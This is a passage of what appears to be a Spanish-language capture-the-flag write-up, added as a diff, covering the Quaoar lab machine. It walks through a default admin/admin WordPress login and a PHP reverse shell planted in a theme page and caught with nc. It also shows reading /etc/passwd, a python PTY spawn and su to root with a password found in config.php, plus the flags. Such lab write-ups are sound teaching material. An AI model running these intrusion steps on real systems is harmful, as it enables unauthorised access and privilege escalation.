@@ -303,3 +303,79 @@ _______________________________________________________________
 [+] Memory used: 17.664 MB
 [+] Elapsed time: 00:00:03
 ```
+Hay varias possibles vulnerabilidades, pero es interesante ver que el usuario admin por defecto está habilitado, vamos a probar de acceder con una contraseña por defecto admin/admin:
+![]({filename}/images/quaoar/wpadmin.png)
+
+Bingo, estamos dentro! Como el primer reto es conseguir un webshell vamos a por ello, editamos un archivo del theme, en mi caso la página de 404 y ahí ponemos el código de un webshell, yo he usado [este](http://pentestmonkey.net/tools/web-shells/php-reverse-shell).
+![]({filename}/images/quaoar/themeshell.png)
+
+luego accedemos por el navegador a la ruta de esa página del tema:
+![]({filename}/images/quaoar/webshell.png)
+
+y escuchamos por nc el puerto que hemos puesto en el webshell... Ya tenemos nuestro shell!
+![]({filename}/images/quaoar/webshell2.png)
+
+De primeras hago un cat a /etc/passwd para ver los usuarios del sistema y veo un usuario llamado wpadmin, voy a su /home/ y ahí encuentro el primer flag.
+![]({filename}/images/quaoar/flag1.png)
+
+```bash
+$ cat flag.txt
+2bafe61f03117ac66a73c3c514de796e
+```
+
+# FLAG 2 - ROOT
+
+Ya tenemos nuestro primer flag, pero no nos da ninguna pista de como avanzar para encontrar nuestro segundo flag y acceso a root. Me dispongo a mirar de primeras el contenido de la web desde el shell por si me he dejado algo y al entrar en la ruta de la web me encuentro una carpeta llamada uploads, accedo en ella y ahí me encuentro un archivo de configuración, (config.php) vamos a ver que hay dentro:
+![]({filename}/images/quaoar/configphp.png)
+
+Pues parece que tenemos unas credenciales root:rootpassword!
+Vamos a probar a ver si con suerte podemos acceder con esta contraseña al usuario root.
+Invocamos terminal por python que sino no podemos hacer su y probamos:
+
+```bash
+$ python -c 'import pty; pty.spawn("/bin/bash")'
+www-data@Quaoar:/$ id
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+www-data@Quaoar:/$ su
+su
+Password: rootpassword!
+root@Quaoar:/#   
+```
+
+Pues sí que ha funcionado! ya somos root, vamos a buscar el segundo flag!
+
+```bash
+root@Quaoar:/# cd /root/
+cd /root/
+root@Quaoar:~# ls
+ls
+flag.txt  vmware-tools-distrib
+root@Quaoar:~# cat flag.txt
+cat flag.txt
+8e3f9ec016e3598c5eec11fd3d73f6fb
+root@Quaoar:~# 
+```
+# FLAG 3 - POST EXPLOTATION
+Aquí lo tenemos! Pues parece que ya tenemos el flag y root debería estar todo, pero en las instrucciones de la máquina se informa de que hay un flag más post-explotación, vamos a buscarlo.
+
+Después de un buen rato buscando en servicios y archivos flag.txt en el equipo no encuentro nada. Me pongo a mirar sobre los servicios IMAP instalados que nos habían salido en el nmap y al hacer un cat al cron por si teníamos ahí algo sobre el IMAP encuentro el tercert flag!
+
+```bash
+root@Quaoar:/# cat /etc/cron.d/*
+cat /etc/cron.d/*
+# /etc/cron.d/php5: crontab fragment for php5
+#  This purges session files older than X, where X is defined in seconds
+#  as the largest value of session.gc_maxlifetime from all your php.ini
+#  files, or 24 minutes if not defined.  See /usr/lib/php5/maxlifetime
+# Its always a good idea to check for crontab to learn more about the operating system good job you get 50! - d46795f84148fd338603d0d6a9dbf8de
+# Look for and purge old sessions every 30 minutes
+09,39 *     * * *     root   [ -x /usr/lib/php5/maxlifetime ] && [ -d /var/lib/php5 ] && find /var/lib/php5/ -depth -mindepth 1 -maxdepth 1 -type f -cmin +$(/usr/lib/php5/maxlifetime) ! -execdir fuser -s {} 2>/dev/null \; -delete
+```
+
+Y ya podemos dar por completada esta máquina.
+
+Flag 1 - 2bafe61f03117ac66a73c3c514de796e
+Flag 2 - 8e3f9ec016e3598c5eec11fd3d73f6fb
+Flag 3 - d46795f84148fd338603d0d6a9dbf8de
+
